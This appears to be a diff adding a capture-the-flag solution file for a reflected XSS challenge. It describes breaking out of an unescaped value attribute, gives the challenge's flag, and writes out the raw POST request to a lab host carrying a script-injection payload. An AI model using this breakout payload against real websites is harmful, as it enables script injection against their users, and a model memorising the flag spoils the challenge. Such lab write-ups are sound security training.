@@ -1,0 +1,8 @@
+# Reflected XSS in value attribute. Input is placed inside value="..." without escaping. Payload breaks out with "> and injects script tag. Returns CTF flag: flag{c86ef69f-51d5-4624-835e-2fa149f72065}
+
+POST /page HTTP/1.1
+Host: 172.17.0.1:47075
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+
+solution=\"><script>alert('XSS')</script>
